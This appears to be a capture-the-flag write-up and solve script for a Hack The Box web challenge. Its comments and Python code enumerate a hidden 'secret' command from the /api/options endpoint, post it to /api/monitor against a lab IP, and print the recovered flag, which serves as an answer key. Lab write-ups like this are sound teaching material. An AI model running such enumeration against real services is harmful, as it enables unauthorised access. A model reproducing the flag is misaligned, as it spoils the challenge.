#!/usr/bin/env bash
set -euo pipefail

# Challenge Name: Flag Command
# Category: Web
# Platform: Hack The Box
#
# Description:
# The application presents a fake terminal-based adventure game where the user
# can type commands to move through a forest maze.
#
# Spawned target used during solving:
# http://154.57.164.79:30267
#
# Core lesson:
# Client-side code often leaks hidden functionality.
#
# In this challenge, the frontend JavaScript fetches all valid commands from
# `/api/options`. That response includes not only the visible step-by-step game
# choices, but also a hidden `secret` command.
#
# The frontend itself reveals the trust boundary problem:
# if (availableOptions[currentStep].includes(currentCommand) ||
#     availableOptions['secret'].includes(currentCommand)) {
#     ...
# }
#
# That means any player who inspects the JavaScript or the options API can send
# the hidden command directly without playing the game at all.
#
# Step 1: Read the frontend JavaScript.
# Manual command:
# curl -s http://154.57.164.79:30267/static/terminal/js/main.js
#
# Reason:
# This shows that the browser fetches:
# GET /api/options
# and later checks both:
# - availableOptions[currentStep]
# - availableOptions['secret']
#
# So there is an explicit secret command list built into the client logic.
#
# Step 2: Pull the command list from the API.
# Manual command:
# curl -s http://154.57.164.79:30267/api/options
#
# Reason:
# The JSON response contains:
# "secret": [
#   "Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"
# ]
#
# This is the hidden input we need.
#
# Step 3: Send the secret command directly.
# Manual command:
# curl -s -X POST http://154.57.164.79:30267/api/monitor \
#   -H 'Content-Type: application/json' \
#   -d '{"command":"Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"}'
#
# Reason:
# The backend accepts the secret command immediately and returns the flag in the
# JSON response. No game progression or cookies are required.
#
# Real-world concept:
# This is a good example of why hidden client-side values are not secrets.
# If the browser can read them, the user can read them too.
#
# Security-sensitive logic should be enforced on the server, not hidden in JS.
#
# Flag obtained:
# HTB{D3v3l0p3r_t00l5_4r3_b35t_wh4t_y0u_Th1nk??!_a514b53e08c2e001d25041c95a2f7053}

host="${1:-154.57.164.79}"
port="${2:-30267}"

python3 - "$host" "$port" <<'PY'
import re
import sys

import requests

host = sys.argv[1]
port = sys.argv[2]
base = f"http://{host}:{port}"

options = requests.get(f"{base}/api/options", timeout=15).json()
secret = options["allPossibleCommands"]["secret"][0]

r = requests.post(f"{base}/api/monitor", json={"command": secret}, timeout=15)
match = re.search(r"HTB\{[^}]+\}", r.text)
if not match:
    raise SystemExit(r.text)

print(match.group(0))
PY
